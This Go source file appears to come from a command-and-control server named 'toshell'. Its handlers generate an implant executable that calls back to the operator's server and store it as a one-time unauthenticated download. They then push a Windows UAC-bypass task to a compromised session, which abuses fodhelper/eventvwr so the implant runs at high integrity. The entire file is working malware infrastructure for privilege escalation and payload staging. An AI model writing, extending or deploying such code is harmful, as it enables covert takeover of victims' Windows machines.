package api

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/gorilla/mux"
	"toshell/internal/server/builder"
	"toshell/internal/server/config"
	"toshell/internal/server/logging"
)

// privescUACHandler UAC 提权：生成当前会话配置的植入端 exe（独立进程运行）
// 并存为一次性载荷（data/uac/<token>.bin），下发 uac_bypass 任务，
// 植入端触发 fodhelper/eventvwr 以高完整性独立进程运行该 exe 回连上线。
func (s *Server) privescUACHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	sess, err := s.sessionMgr.GetSessionInfo(id)
	if err != nil || sess == nil {
		http.Error(w, `{"error":"Session not found"}`, http.StatusNotFound)
		return
	}
	if s.listener == nil {
		http.Error(w, `{"error":"Listener not available"}`, http.StatusInternalServerError)
		return
	}
	if sess.OS != "windows" {
		http.Error(w, `{"error":"UAC bypass 仅支持 Windows 会话"}`, http.StatusBadRequest)
		return
	}

	// 生成当前会话配置的植入端 exe（回连本服务器）。
	// 注意：不生成 donut shellcode——Go 植入端在宿主进程内内存执行会接管
	// 进程导致掉线，故提权载荷为独立进程运行的 exe（%TEMP% 短暂落地自删）。
	cfg := config.Get()
	listenerHost := extractRequestHost(r)
	if listenerHost == "" || listenerHost == "0.0.0.0" {
		listenerHost = cfg.Listener.PublicHost
	}
	if listenerHost == "" || listenerHost == "0.0.0.0" {
		listenerHost = cfg.Listener.Host
	}
	if listenerHost == "" || listenerHost == "0.0.0.0" {
		listenerHost = cfg.Server.Host
	}
	scheme := "http"
	if cfg.Listener.TLSEnabled {
		scheme = "https"
	}
	serverURL := fmt.Sprintf("%s://%s:%d", scheme, listenerHost, cfg.Listener.Port)

	opts := builder.BuildOptions{
		OS:        sess.OS,
		Arch:      sess.Arch,
		Format:    "exe",
		ServerURL: serverURL,
		Protocol:  cfg.Listener.Protocol,
		Interval:  cfg.Implant.Interval,
		Jitter:    cfg.Implant.Jitter,
		RetryWait: cfg.Implant.RetryWait,
	}
	result, err := s.builder.Build(opts)
	if err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"生成提权载荷失败: %v"}`, err), http.StatusInternalServerError)
		return
	}
	exeBytes := result.Binary
	if len(exeBytes) == 0 {
		http.Error(w, `{"error":"提权载荷为空"}`, http.StatusInternalServerError)
		return
	}

	// 一次性 token 载荷
	tokenBytes := make([]byte, 12)
	_, _ = rand.Read(tokenBytes)
	token := hex.EncodeToString(tokenBytes)
	uacDir := filepath.Join("data", "uac")
	if err := os.MkdirAll(uacDir, 0o755); err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"%v"}`, err), http.StatusInternalServerError)
		return
	}
	if err := os.WriteFile(filepath.Join(uacDir, token), exeBytes, 0o644); err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"%v"}`, err), http.StatusInternalServerError)
		return
	}

	scheme2 := "http"
	host := extractRequestHost(r)
	apiPort := s.cfg.Server.APIPort
	if apiPort == 0 {
		apiPort = 18081
	}
	payloadURL := fmt.Sprintf("%s://%s:%d/api/v1/implant/uac/%s", scheme2, host, apiPort, token)

	taskInfo, err := s.taskMgr.CreateUACBypass(id, payloadURL)
	if err != nil {
		_ = os.Remove(filepath.Join(uacDir, token))
		http.Error(w, fmt.Sprintf(`{"error":"%v"}`, err), http.StatusInternalServerError)
		return
	}
	if err := s.listener.PushTask(id, taskInfo); err != nil {
		_ = os.Remove(filepath.Join(uacDir, token))
		http.Error(w, fmt.Sprintf(`{"error":"%v"}`, err), http.StatusInternalServerError)
		return
	}

	logging.Info("api", "UAC bypass task pushed to session %s (payload %d bytes)", id, len(exeBytes))
	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"message":   "UAC 提权任务已下发：高完整性独立进程将启动植入端并回连上线",
	})
}

// uacPayloadHandler 免认证一次性提权载荷下载（提权进程无 token，仅能通过该 URL 获取）。
func (s *Server) uacPayloadHandler(w http.ResponseWriter, r *http.Request) {
	token := mux.Vars(r)["token"]
	if token == "" || strings.ContainsAny(token, "/\\.") || len(token) > 64 {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	path := filepath.Join("data", "uac", token)
	data, err := os.ReadFile(path)
	if err != nil {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	// 一次性：读取后立即删除
	_ = os.Remove(path)
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Write(data)
}
